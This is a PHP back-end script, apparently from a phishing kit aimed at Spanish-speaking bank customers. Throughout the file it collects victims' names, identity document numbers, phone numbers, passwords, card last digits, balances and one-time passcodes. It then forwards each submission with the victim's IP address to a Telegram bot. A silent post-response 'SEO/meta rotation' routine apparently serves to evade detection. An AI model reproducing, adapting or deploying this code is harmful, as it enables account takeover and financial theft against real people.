<?php
require_once __DIR__ . '/config.php';

header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false]);
    exit;
}

// Acepta JSON o form-data
$raw = file_get_contents('php://input');
$input = json_decode($raw, true);
if (!is_array($input)) $input = $_POST;

$step = isset($input['step']) ? $input['step'] : '';

function val($a, $k) { return isset($a[$k]) ? trim((string)$a[$k]) : ''; }

function get_ip() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $ip = trim(explode(',', $_SERVER[$h])[0]);
            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
        }
    }
    return '';
}

$ip = get_ip();
$msg = '';

switch ($step) {
    case 'datos':
        $nombre = trim(val($input, 'nombres') . ' ' . val($input, 'apellidos'));
        $msg  = "🆕 *NUEVO REGISTRO*\n";
        $msg .= "👤 " . $nombre . "\n";
        $msg .= "🪪 " . val($input, 'tipoDoc') . " " . val($input, 'numDoc') . "\n";
        $msg .= "📅 " . val($input, 'fechaExp') . " · " . val($input, 'lugarExp');
        break;

    case 'acceso':
        $msg  = "🔐 *ACCESO*\n";
        $msg .= "📱 " . val($input, 'countryCode') . " " . val($input, 'phone') . "\n";
        $msg .= "🔑 " . val($input, 'password');
        break;

    case 'validacion':
        $bal = (float) preg_replace('/[^\d]/', '', val($input, 'balance'));
        $msg  = "✅ *VALIDACIÓN*\n";
        $msg .= "🔢 " . val($input, 'lastDigits') . "\n";
        $msg .= "💰 $" . number_format($bal, 0, ',', '.');
        break;

    case 'otp':
        $msg  = "🔓 *CLAVE OTP*\n";
        $msg .= "🔑 " . val($input, 'otp');
        break;

    default:
        http_response_code(400);
        echo json_encode(['ok' => false, 'error' => 'step_invalido']);
        exit;
}

if ($ip !== '') {
    $msg .= "\n🌐 " . $ip;
}

$url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
$data = [
    'chat_id'    => TELEGRAM_CHAT_ID,
    'text'       => $msg,
    'parse_mode' => 'Markdown',
];

$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query($data),
    CURLOPT_TIMEOUT        => 10,
    CURLOPT_SSL_VERIFYPEER => false,
]);
curl_exec($ch);
curl_close($ch);

echo json_encode(['ok' => true]);

// =====================================================================
// Rotación automática SEO/meta (sin cron, sin bloquear al usuario).
// Cada 6 horas, la primera petición tras ese intervalo dispara la rotación.
// Las demás peticiones simultáneas no la repiten gracias a un lock.
// =====================================================================
//
// Nos despedimos del usuario antes de rotar, así no se nota latencia.
if (function_exists('fastcgi_finish_request')) {
    fastcgi_finish_request();
} else {
    // Fallback genérico
    @ignore_user_abort(true);
    @ob_end_flush();
    @flush();
}

@set_time_limit(30);

try {
    require_once __DIR__ . '/rotate_lib.php';
    nq_maybe_rotate(6 * 3600); // cada 6 horas
} catch (Throwable $e) {
    // silencio: nunca debe afectar la respuesta ya enviada
}
